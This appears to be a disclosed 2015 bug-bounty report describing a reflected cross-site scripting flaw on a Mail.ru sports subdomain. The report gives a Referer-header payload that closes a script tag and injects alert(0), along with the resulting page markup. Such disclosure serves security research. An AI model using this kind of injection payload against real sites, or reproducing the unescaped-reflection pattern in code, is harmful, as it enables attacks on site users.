@@ -1,0 +1,47 @@
+ReportLink:https://hackerone.com/reports/51140
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/ddworken
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:21.05.2015 1:20:31
+
+Summary:
+
+The XSS vulnerability is located here:
+
+```
+https://touch.sports.mail.ru
+```
+
+and is triggered by setting referer to:
+
+```
+ttttt</script><script>alert(0)</script><script>
+```
+
+The problem is that the referer is being loaded like so:
+
+```html
+<script>
+     [Other Javascript Here]	
+    "httpReferer":"ttttt
+</script>
+<script>
+    alert(0)
+</script>
+<script>
+    ","user":"","topBanner":{"sz":9,"slot":3333},"retinaBanner":" <div class=\"ad\">\r\n<img src=\"https:\/\/rs.mail.ru\/a12327061.gif?sz=9\&amp;rnd=931100856\&ts=1426172695\&sz=9\" style=\"width:0;height:0;position:absolute;\" alt=\"\"\/>\n<!--zg-->\r\n<\/div>"}
+</script>
+```
+
+where the relevant part is:
+
+``` html
+<script>
+    alert(0)
+</script>
+```
+
+I am aware that this is out of scope, but I am still reporting it since I just happened to spot it while looking for other bugs. 
